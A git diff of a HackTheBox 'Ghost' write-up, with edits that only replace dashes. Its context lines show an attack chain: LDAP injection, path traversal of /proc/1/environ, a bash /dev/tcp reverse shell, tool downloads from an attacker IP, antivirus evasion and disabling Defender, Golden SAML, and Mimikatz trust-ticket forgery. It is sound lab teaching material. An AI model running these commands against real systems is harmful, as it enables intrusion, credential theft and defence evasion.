@@ -1,4 +1,4 @@
-# HackTheBox — Ghost
+# HackTheBox - Ghost
 
 <div align="center">
 
@@ -8,7 +8,7 @@
 
 ---
 
-## Phase 1 — Reconnaissance
+## Phase 1 - Reconnaissance
 
 ### Port Scan
 
@@ -29,9 +29,9 @@ RustScan was used for speed, passing all discovered ports through to Nmap's serv
 |8008 / 8443|HTTP / HTTPS|Non-standard web apps|
 |5985|WinRM|Remote management|
 
-### Clock Skew — Critical for Kerberos
+### Clock Skew - Critical for Kerberos
 
-The Nmap output reported a clock skew of approximately **-1 hour**. This is not cosmetic — Kerberos authentication has a strict 5-minute tolerance. Any skew beyond that will cause all Kerberos operations to fail silently or with cryptic errors.
+The Nmap output reported a clock skew of approximately **-1 hour**. This is not cosmetic - Kerberos authentication has a strict 5-minute tolerance. Any skew beyond that will cause all Kerberos operations to fail silently or with cryptic errors.
 
 ```bash
 ntpdate -u 10.129.8.228
@@ -57,7 +57,7 @@ No subdomains via DNS. Web enumeration is the next entry point.
 
 ---
 
-## Phase 2 — Web Enumeration & Vhost Discovery
+## Phase 2 - Web Enumeration & Vhost Discovery
 
 ### Application Mapping
 
@@ -68,7 +68,7 @@ Four HTTP/HTTPS services were active:
 |80|HTTP|No content|
 |443|HTTPS|No content|
 |8008|HTTP|Ghost CMS blog|
-|8443|HTTPS|Login page — clicking login reveals `federation.ghost.htb`|
+|8443|HTTPS|Login page - clicking login reveals `federation.ghost.htb`|
 
 <img width="1285" height="693" alt="Pasted image 20260610205843" src="https://github.com/user-attachments/assets/b8dce424-4715-437a-b5ad-c986e59e815d" />
 
@@ -76,7 +76,7 @@ Four HTTP/HTTPS services were active:
 <img width="1639" height="836" alt="Pasted image 20260610205852" src="https://github.com/user-attachments/assets/0563ecb2-f1cc-4e93-a0e0-f0abbe367be6" />
 
 
-`federation.ghost.htb` was added to `/etc/hosts` immediately. This is an ADFS federation endpoint — highly significant for the endgame.
+`federation.ghost.htb` was added to `/etc/hosts` immediately. This is an ADFS federation endpoint - highly significant for the endgame.
 
 ### Virtual Host Fuzzing
 
@@ -91,7 +91,7 @@ ffuf -u http://ghost.htb:8008 \
 
 The `-fs` flag filters by response size. The three values correspond to the default responses for non-existent vhosts. Any response with a _different_ size is a real vhost.
 
-**Result:** `intranet.ghost.htb` — a corporate intranet portal with a login form.
+**Result:** `intranet.ghost.htb` - a corporate intranet portal with a login form.
 
 <img width="1312" height="418" alt="Pasted image 20260610205920" src="https://github.com/user-attachments/assets/5fd383a1-6e7f-4e3c-a17e-e83520ec1806" />
 
@@ -107,9 +107,9 @@ Updated `/etc/hosts`:
 
 ---
 
-## Phase 3 — LDAP Injection & Credential Extraction
+## Phase 3 - LDAP Injection & Credential Extraction
 
-### Initial LDAP Injection — Login Bypass
+### Initial LDAP Injection - Login Bypass
 
 The intranet login form was captured in Burp Suite. Error messages on failed login attempts revealed LDAP-style feedback, indicating the backend was querying an LDAP directory. Testing the most basic wildcard injection:
 
@@ -124,13 +124,13 @@ password: *
 <img width="1307" height="628" alt="Pasted image 20260610210039" src="https://github.com/user-attachments/assets/7ff9649a-c276-4558-8120-4e736472faea" />
 
 
-The result was a **successful login** — authenticated as `kathryn.holland`. The backend LDAP filter was likely structured as:
+The result was a **successful login** - authenticated as `kathryn.holland`. The backend LDAP filter was likely structured as:
 
 ```
 (&(uid=*)(userPassword=*))
 ```
 
-Both wildcards match any value, so the query always returns the first user in the directory. Classic LDAP injection — login bypassed.
+Both wildcards match any value, so the query always returns the first user in the directory. Classic LDAP injection - login bypassed.
 
 <img width="1647" height="770" alt="Pasted image 20260610210103" src="https://github.com/user-attachments/assets/4b0b18c6-5216-4ae2-98c5-0329f991e14b" />
 
@@ -138,8 +138,8 @@ Both wildcards match any value, so the query always returns the first user in th
 
 Once inside, the intranet forum revealed two critical facts:
 
-1. **A Gitea instance exists** — the team is migrating from Gitea to Bitbucket. Gitea was found at `http://gitea.ghost.htb:8008`.
-2. **A service account `gitea_temp_principal`** — created with a temporary secret for the migration. This is the target.
+1. **A Gitea instance exists** - the team is migrating from Gitea to Bitbucket. Gitea was found at `http://gitea.ghost.htb:8008`.
+2. **A service account `gitea_temp_principal`** - created with a temporary secret for the migration. This is the target.
 
 <img width="1648" height="835" alt="Pasted image 20260610210145" src="https://github.com/user-attachments/assets/54b05a67-a99c-418b-9e99-9b9267689e4e" />
 
@@ -154,11 +154,11 @@ username: gitea_temp_principal
 password: *
 ```
 
-Login succeeded — the account is valid. The wildcard matched whatever the actual password was. Now the objective was to recover the real secret character by character.
+Login succeeded - the account is valid. The wildcard matched whatever the actual password was. Now the objective was to recover the real secret character by character.
 
 <img width="1657" height="627" alt="Pasted image 20260610210336" src="https://github.com/user-attachments/assets/5c6e4b0a-ba36-457d-8382-884e9cce59b2" />
 
-### Blind LDAP Injection — Character-by-Character Secret Extraction
+### Blind LDAP Injection - Character-by-Character Secret Extraction
 
 This is conceptually identical to blind SQL injection but against an LDAP backend. The LDAP filter for the login is likely:
 
@@ -172,12 +172,12 @@ By submitting a password of `s*`, the filter becomes:
 (&(uid=gitea_temp_principal)(userPassword=s*))
 ```
 
-If the password starts with `s`, LDAP returns a match (successful login). If not, it returns nothing (failed login). This is a **binary oracle** — yes or no for each character guess.
+If the password starts with `s`, LDAP returns a match (successful login). If not, it returns nothing (failed login). This is a **binary oracle** - yes or no for each character guess.
 
 <img width="1564" height="740" alt="Pasted image 20260610210425" src="https://github.com/user-attachments/assets/6274cb84-d15e-4a64-a3c1-f493b4e5432a" />
 
 
-This was automated in **Burp Suite Intruder** (Sniper mode) with a character set payload of `a-z0-9`. The distinguishing factor was the HTTP response code and body — a valid character returned the same successful login response as `*:*`, while an invalid character returned an error page.
+This was automated in **Burp Suite Intruder** (Sniper mode) with a character set payload of `a-z0-9`. The distinguishing factor was the HTTP response code and body - a valid character returned the same successful login response as `*:*`, while an invalid character returned an error page.
 
 Extraction proceeded position by position:
 
@@ -200,13 +200,13 @@ Login to Gitea successful.
 
 ---
 
-## Phase 4 — Source Code Analysis (Gitea)
+## Phase 4 - Source Code Analysis (Gitea)
 
 Two repositories were discovered: **`intranet`** and **`blog`**.
 
 <img width="1651" height="642" alt="Pasted image 20260610210936" src="https://github.com/user-attachments/assets/9cc6e205-f625-4208-aa16-f8153f5eec06" />
 
-### Repository: `blog` — Path Traversal in Ghost CMS
+### Repository: `blog` - Path Traversal in Ghost CMS
 
 A modified Ghost CMS file (`posts-public.js`) was present in the blog repository. The relevant code:
 
@@ -224,7 +224,7 @@ The `extra` query parameter is passed directly into `fs.readFileSync()` with **n
 
 The Ghost content API requires a public API key, which was visible in the repository and Ghost's documentation.
 
-### Repository: `intranet` — Command Injection in Rust Backend
+### Repository: `intranet` - Command Injection in Rust Backend
 
 The intranet backend was written in Rust. The critical section from the `intranet` repository:
 
@@ -251,9 +251,9 @@ async fn scan_handler(
 }
 ```
 
-The `data.url` field is interpolated directly into a shell command string. This is OS command injection — anything after a `;`, `&&`, `||`, or `$()` executes as a separate shell command.
+The `data.url` field is interpolated directly into a shell command string. This is OS command injection - anything after a `;`, `&&`, `||`, or `$()` executes as a separate shell command.
 
-The only protection is the `X-DEV-INTRANET-KEY` header check. The key is loaded from an **environment variable** at startup — meaning it will appear in `/proc/1/environ` if that process is running the intranet service.
+The only protection is the `X-DEV-INTRANET-KEY` header check. The key is loaded from an **environment variable** at startup - meaning it will appear in `/proc/1/environ` if that process is running the intranet service.
 
 **The full chain is now clear:**
 
@@ -263,7 +263,7 @@ The only protection is the `X-DEV-INTRANET-KEY` header check. The key is loaded 
 
 ---
 
-## Phase 5 — Path Traversal → Key Extraction
+## Phase 5 - Path Traversal → Key Extraction
 
 The Ghost content API exposes posts publicly with a content API key. The traversal payload targets the process environment:
 
@@ -271,7 +271,7 @@ The Ghost content API exposes posts publicly with a content API key. The travers
 curl "http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../../proc/1/environ"
 ```
 
-The response contained the raw environment of the Ghost process — a null-byte-delimited list of `KEY=VALUE` pairs. Within it, the `DEV_INTRANET_KEY` variable was present in plaintext.
+The response contained the raw environment of the Ghost process - a null-byte-delimited list of `KEY=VALUE` pairs. Within it, the `DEV_INTRANET_KEY` variable was present in plaintext.
 
 <img width="1644" height="425" alt="Pasted image 20260610211149" src="https://github.com/user-attachments/assets/b299fe75-8933-4329-8a15-67c003eedc94" />
 
@@ -282,7 +282,7 @@ The response contained the raw environment of the Ghost process — a null-byte-
 
 ---
 
-## Phase 6 — Remote Code Execution
+## Phase 6 - Remote Code Execution
 
 With the `DEV_INTRANET_KEY` in hand, the command injection endpoint was exploited. The payload terminates the `intranet_url_check` command with a semicolon and appends a bash reverse shell:
 
@@ -299,16 +299,16 @@ curl -X POST http://intranet.ghost.htb:8008/api-dev/scan \
 
 The bash reverse shell payload breakdown:
 
-- `bash -i` — interactive bash shell
-- `>&` — redirects both stdout and stderr to the same destination
-- `/dev/tcp/IP/PORT` — bash's built-in TCP connection (no external binaries required)
-- `0>&1` — redirects stdin from the same TCP connection
+- `bash -i` - interactive bash shell
+- `>&` - redirects both stdout and stderr to the same destination
+- `/dev/tcp/IP/PORT` - bash's built-in TCP connection (no external binaries required)
+- `0>&1` - redirects stdin from the same TCP connection
 
 **Result:** Shell received on the netcat listener. Foothold established on the container running the intranet service.
 
 ---
 
-## Phase 7 — SSH ControlMaster Pivot
+## Phase 7 - SSH ControlMaster Pivot
 
 ### Enumeration of the Foothold
 
@@ -325,7 +325,7 @@ The foothold was a Docker container. Enumeration of the filesystem revealed a ba
 
 SSH ControlMaster is a multiplexing feature that allows multiple SSH sessions to share a single authenticated TCP connection. When enabled, SSH creates a **Unix domain socket** on the filesystem. Subsequent SSH connections to the same destination reuse this socket instead of re-authenticating.
 
-The critical implication: **the control socket represents an already-authenticated session**. Anyone with filesystem access to the socket can piggyback on it — no credentials required.
+The critical implication: **the control socket represents an already-authenticated session**. Anyone with filesystem access to the socket can piggyback on it - no credentials required.
 
 The socket tells us:
 
@@ -355,11 +355,11 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 ---
 
-## Phase 8 — Kerberos Ticket & Network Tunneling
+## Phase 8 - Kerberos Ticket & Network Tunneling
 
 ### Kerberos Ticket Extraction
 
-Enumeration of `florence.ramirez`'s environment revealed an active **Kerberos credential cache** — a `.ccache` file containing a valid TGT for the user within the `ghost.htb` domain. The ticket was base64-encoded in a file on disk.
+Enumeration of `florence.ramirez`'s environment revealed an active **Kerberos credential cache** - a `.ccache` file containing a valid TGT for the user within the `ghost.htb` domain. The ticket was base64-encoded in a file on disk.
 
 <img width="700" height="522" alt="Pasted image 20260610211604" src="https://github.com/user-attachments/assets/f6f953f2-ce19-423c-8816-3d38fc0d0453" />
 
@@ -370,7 +370,7 @@ echo "<base64_content>" | base64 -d > /tmp/ticket.krb5cc
 export KRB5CCNAME=/tmp/ticket.krb5cc
 ```
 
-This ticket enables Kerberos-authenticated operations against the DC as `florence.ramirez` — immediately useful for DNS record injection later.
+This ticket enables Kerberos-authenticated operations against the DC as `florence.ramirez` - immediately useful for DNS record injection later.
 
 ### Network Topology
 
@@ -380,16 +380,16 @@ The `/etc/hosts` file on `dev.workstation` revealed the internal network:
 10.0.0.254   dc01.ghost.htb ghost.htb
 ```
 
-The DC is at `10.0.0.254` — not directly reachable from the attack box. A tunnel through the compromised workstation is required.
+The DC is at `10.0.0.254` - not directly reachable from the attack box. A tunnel through the compromised workstation is required.
 
 ### Ligolo-ng Tunnel Setup
 
 Ligolo-ng creates a proper **tun interface** on the attack box, allowing any tool to route traffic through the pivot without requiring proxychains.
 
-**Transfer the agent** — `curl`/`wget` unavailable on the foothold, so Python's urllib was used:
+**Transfer the agent** - `curl`/`wget` unavailable on the foothold, so Python's urllib was used:
 
 ```bash
-# Attack box — serve the agent
+# Attack box - serve the agent
 python3 -m http.server 8000
 
 # On dev.workstation
@@ -442,13 +442,13 @@ ping -c 1 10.0.0.254
 
 ---
 
-## Phase 9 — NTLM Hash Capture via DNS Poisoning
+## Phase 9 - NTLM Hash Capture via DNS Poisoning
 
 ### Intelligence from the Intranet Forum
 
 Re-reading the intranet forum as `kathryn.holland`:
 
-> **Justin:** "My script keeps failing — it's trying to connect to `bitbucket.ghost.htb` but getting DNS resolution errors."  
+> **Justin:** "My script keeps failing - it's trying to connect to `bitbucket.ghost.htb` but getting DNS resolution errors."  
 > **Kathryn:** "Don't worry, just keep running it."
 
 <img width="1454" height="237" alt="Pasted image 20260610211814" src="https://github.com/user-attachments/assets/690f5e35-ed7e-4aa3-a47c-bd951b285df2" />
@@ -503,7 +503,7 @@ Mode `5600` is NetNTLMv2. The hash cracked quickly.
 
 ---
 
-## Phase 10 — BloodHound & GMSA Abuse
+## Phase 10 - BloodHound & GMSA Abuse
 
 ### BloodHound Collection
 
@@ -528,7 +528,7 @@ BloodHound revealed a direct attack path:
 JUSTIN.BRADLEY → [ReadGMSAPassword] → ADFS_GMSA$
 ```
 
-**Group Managed Service Accounts (GMSA)** are AD accounts with automatically rotating passwords, managed by the domain controller. The password is stored as the `msDS-ManagedPassword` attribute in AD — readable only by explicitly authorized principals. `JUSTIN.BRADLEY` had been granted `ReadGMSAPassword` over `ADFS_GMSA$`.
+**Group Managed Service Accounts (GMSA)** are AD accounts with automatically rotating passwords, managed by the domain controller. The password is stored as the `msDS-ManagedPassword` attribute in AD - readable only by explicitly authorized principals. `JUSTIN.BRADLEY` had been granted `ReadGMSAPassword` over `ADFS_GMSA$`.
 
 <img width="1104" height="173" alt="Pasted image 20260610212145" src="https://github.com/user-attachments/assets/4ba09c3e-5caf-4ed3-af0f-bcb172f37474" />
 
@@ -566,7 +566,7 @@ Shell established on the DC as the ADFS service account.
 
 ---
 
-## Phase 11 — ADFS Dump & Golden SAML
+## Phase 11 - ADFS Dump & Golden SAML
 
 ### What is Golden SAML?
 
@@ -579,7 +579,7 @@ A **Golden SAML** attack mirrors the concept of a Golden Ticket but at the feder
 |Golden Ticket|`krbtgt` hash|Kerberos TGT|
 |Golden SAML|ADFS signing key|SAML assertion|
 
-With a forged SAML assertion, you can claim to be **any user** — including `Administrator` — for any application that trusts this ADFS server. It bypasses passwords, MFA, and every other authentication control at the application layer.
+With a forged SAML assertion, you can claim to be **any user** - including `Administrator` - for any application that trusts this ADFS server. It bypasses passwords, MFA, and every other authentication control at the application layer.
 
 ### Extracting ADFS Secrets with ADFSDump
 
@@ -603,8 +603,8 @@ wget http://10.10.16.11:8000/ADFSDump.exe -O ADFSDump.exe
 
 ADFSDump extracts:
 
-1. **The encrypted PFX blob** — the token signing certificate, encrypted with the ADFS DKM key
-2. **The DKM decryption key** — stored in AD under a specific container, readable only by the ADFS service account
+1. **The encrypted PFX blob** - the token signing certificate, encrypted with the ADFS DKM key
+2. **The DKM decryption key** - stored in AD under a specific container, readable only by the ADFS service account
 
 ### Preparing the Key Material on the Attack Box
 
@@ -641,13 +641,13 @@ ADFSpoof decrypts the PFX using the DKM key, then signs a new SAML assertion cla
 <img width="1194" height="358" alt="Pasted image 20260610212620" src="https://github.com/user-attachments/assets/576d0d13-ff31-4154-b46d-3c6d07b3a861" />
 
 
-2. Send to **Repeater** — change method to `POST`, endpoint: `/adfs/saml/postResponse`
+2. Send to **Repeater** - change method to `POST`, endpoint: `/adfs/saml/postResponse`
 3. Set body: `SAMLResponse=<URL_ENCODED_BASE64_TOKEN>`
 
 <img width="648" height="622" alt="Pasted image 20260609204211" src="https://github.com/user-attachments/assets/f8ff4574-1584-4934-be87-97850f0129c5" />
 
 
-4. Send — the response returns a valid session cookie for `Administrator`
+4. Send - the response returns a valid session cookie for `Administrator`
 
 <img width="631" height="204" alt="vmware_A2Pn3XfaiD" src="https://github.com/user-attachments/assets/bfc84e85-6471-4e6c-b857-cd2af3052750" />
 
@@ -656,14 +656,14 @@ ADFSpoof decrypts the PFX using the DKM key, then signs a new SAML assertion cla
 
 <img width="1208" height="329" alt="vmware_94Ja0DJO7U" src="https://github.com/user-attachments/assets/ccc9408e-dcfc-4599-bdee-63214373958b" />
 
-**Result:** Full access to the **Ghost Configuration Panel** — a web-based SQL execution interface.
+**Result:** Full access to the **Ghost Configuration Panel** - a web-based SQL execution interface.
 
 <img width="533" height="479" alt="Pasted image 20260610212944" src="https://github.com/user-attachments/assets/bfba484e-abd2-4866-848a-cad9a02095c6" />
 
 
 ---
 
-## Phase 12 — Linked SQL Server Abuse
+## Phase 12 - Linked SQL Server Abuse
 
 ### Database Reconnaissance
 
@@ -710,7 +710,7 @@ SELECT * FROM OPENQUERY("PRIMARY",
 <img width="611" height="387" alt="Pasted image 20260610213128" src="https://github.com/user-attachments/assets/57e9d9ed-3ff7-45c8-a046-586564e1c5c5" />
 
 
-`bridge_corp` can impersonate `sa` — the highest-privileged SQL Server login (sysadmin by default).
+`bridge_corp` can impersonate `sa` - the highest-privileged SQL Server login (sysadmin by default).
 
 ### Enabling xp_cmdshell
 
@@ -759,7 +759,7 @@ EXECUTE('EXECUTE AS LOGIN=''sa'';
 
 ---
 
-## Phase 13 — SeImpersonate → SYSTEM (AV Bypass)
+## Phase 13 - SeImpersonate → SYSTEM (AV Bypass)
 
 ### Privilege Enumeration
 
@@ -770,7 +770,7 @@ whoami /all
 <img width="700" height="166" alt="Pasted image 20260610213450" src="https://github.com/user-attachments/assets/cc565adc-0982-4eb1-a936-c9118d375476" />
 
 
-The service account had **`SeImpersonatePrivilege`** enabled — the standard potato exploit entry point.
+The service account had **`SeImpersonatePrivilege`** enabled - the standard potato exploit entry point.
 
 ### Windows Defender Active
 
@@ -784,20 +784,20 @@ Get-MpComputerStatus | Select RealTimeProtectionEnabled
 
 Windows Defender was running with real-time protection. Uploading a precompiled `GodPotato.exe` or `PrintSpoofer.exe` would be flagged and quarantined immediately.
 
-### AV Bypass Strategy — On-Target Compilation
+### AV Bypass Strategy - On-Target Compilation
 
-The solution: **don't bring a binary — bring source code**.
+The solution: **don't bring a binary - bring source code**.
 
-The .NET framework ships with `csc.exe` — a full C# compiler — on every Windows installation with .NET 4.x. Compiling an exploit on the target produces a binary that:
+The .NET framework ships with `csc.exe` - a full C# compiler - on every Windows installation with .NET 4.x. Compiling an exploit on the target produces a binary that:
 
 - Has no known signature in AV databases (it was just created)
 - Doesn't match any hash-based detection
 - Uses a legitimate Windows API (EFS RPC) so behavioral detection is minimal
 
-The exploit used was **EfsPotato** — a `SeImpersonate` exploit targeting the Encrypting File System RPC interface, valid on Windows Server 2019/2022.
+The exploit used was **EfsPotato** - a `SeImpersonate` exploit targeting the Encrypting File System RPC interface, valid on Windows Server 2019/2022.
 
 ```powershell
-# Download C# source — AV ignores .cs files
+# Download C# source - AV ignores .cs files
 iwr "http://10.10.16.11:8000/EfsPotato.cs" -OutFile EfsPotato.cs
 
 # Compile on the target using the built-in .NET compiler
@@ -851,19 +851,19 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 
 ---
 
-## Phase 14 — Inter-Forest Trust Exploitation
+## Phase 14 - Inter-Forest Trust Exploitation
 
 This is the final and most technically demanding phase. The objective is to leverage the inter-forest trust between `CORP.GHOST.HTB` and `GHOST.HTB` to forge a ticket carrying `Enterprise Admins` privileges in the parent forest.
 
 ### Understanding the Attack
 
-When two AD forests have a trust relationship, they exchange a **trust key** — a shared secret (RC4 or AES) that both domain controllers use to sign and verify cross-forest referral tickets. This key is how `GHOST.HTB`'s KDC knows that a ticket referral coming from `CORP.GHOST.HTB` is legitimate.
+When two AD forests have a trust relationship, they exchange a **trust key** - a shared secret (RC4 or AES) that both domain controllers use to sign and verify cross-forest referral tickets. This key is how `GHOST.HTB`'s KDC knows that a ticket referral coming from `CORP.GHOST.HTB` is legitimate.
 
 **The attack premise:** If an attacker compromises a DC in `CORP.GHOST.HTB` and extracts the inter-forest trust key, they can forge a cross-realm TGT that:
 
 1. Claims to originate legitimately from `CORP.GHOST.HTB`
 2. Contains an **ExtraSIDs** field with the `Enterprise Admins` SID from `GHOST.HTB`
-3. Is signed with the stolen trust key — so `GHOST.HTB`'s KDC accepts it without question
+3. Is signed with the stolen trust key - so `GHOST.HTB`'s KDC accepts it without question
 
 When `GHOST.HTB` processes the ticket, it sees the Enterprise Admins SID in the PAC and grants the corresponding domain-wide privileges.
 
@@ -875,7 +875,7 @@ When `GHOST.HTB` processes the ticket, it sees the Enterprise Admins SID in the 
 |Enterprise Admins SID (GHOST.HTB)|`S-1-5-21-4084500788-938703357-3654145966-519`|BloodHound|
 |CORP.GHOST.HTB Domain SID|`S-1-5-21-2034262909-2733679486-179904498`|BloodHound|
 
-### Step 1 — Extract the Trust Key with Mimikatz
+### Step 1 - Extract the Trust Key with Mimikatz
 
 ```powershell
 # Upload Mimikatz (Defender is disabled)
@@ -891,9 +891,9 @@ lsadump::trust /patch
 <img width="1647" height="660" alt="Pasted image 20260610214432" src="https://github.com/user-attachments/assets/d834dba1-bad0-4d39-8ce0-862943a466ea" />
 
 
-This dumps all inter-domain and inter-forest trust keys from the DC's LSA secrets. The target value is `rc4_hmac_nt` for the `GHOST.HTB` trust entry — the shared secret between the two forests.
+This dumps all inter-domain and inter-forest trust keys from the DC's LSA secrets. The target value is `rc4_hmac_nt` for the `GHOST.HTB` trust entry - the shared secret between the two forests.
 
-### Step 2 — Forge the Inter-Forest Trust Ticket
+### Step 2 - Forge the Inter-Forest Trust Ticket
 
 ```
 kerberos::golden \
@@ -917,12 +917,12 @@ Parameter breakdown:
 |`/user`|Administrator|Identity claimed in the ticket|
 |`/domain`|CORP.GHOST.HTB|The issuing domain (where we have the trust key)|
 |`/sid`|CORP SID + `-502`|Base SID (krbtgt RID in CORP domain)|
-|`/sids`|Enterprise Admins SID|**ExtraSIDs** — injected into the PAC, grants elevated rights in GHOST.HTB|
+|`/sids`|Enterprise Admins SID|**ExtraSIDs** - injected into the PAC, grants elevated rights in GHOST.HTB|
 |`/rc4`|Trust key hash|Signs the ticket so GHOST.HTB's KDC accepts it|
 |`/service`|krbtgt|Marks this as a TGT-type ticket for cross-realm use|
 |`/target`|GHOST.HTB|The target forest realm|
 
-### Step 3 — Request a Service Ticket for CIFS
+### Step 3 - Request a Service Ticket for CIFS
 
 The forged TGT is for the `GHOST.HTB` realm. Use Rubeus to request a service ticket for CIFS (SMB) on the DC and inject it into the current session:
 
@@ -935,14 +935,14 @@ The forged TGT is for the `GHOST.HTB` realm. Use Rubeus to request a service tic
   /ptt
 ```
 
-- `/ptt` — **Pass-the-Ticket**: injects the TGS directly into the current Kerberos session cache
-- `/nowrap` — prevents base64 line wrapping in the output
+- `/ptt` - **Pass-the-Ticket**: injects the TGS directly into the current Kerberos session cache
+- `/nowrap` - prevents base64 line wrapping in the output
 
 <img width="1642" height="441" alt="Pasted image 20260610214657" src="https://github.com/user-attachments/assets/c2805365-3dde-4709-99ef-096354418e47" />
 
 <img width="431" height="192" alt="Pasted image 20260610214725" src="https://github.com/user-attachments/assets/c5fe999c-6e8e-4dcf-aa99-55d1950470f5" />
 
-### Step 4 — Confirm Domain Admin Access
+### Step 4 - Confirm Domain Admin Access
 
 ```powershell
 dir \\dc01.ghost.htb\C$
@@ -959,4 +959,4 @@ The directory listing of the DC's C drive returned successfully. Full `Enterpris
 
 ---
 
-_Writeup by ctxzero — HackTheBox: Ghost_
+_Writeup by ctxzero - HackTheBox: Ghost_
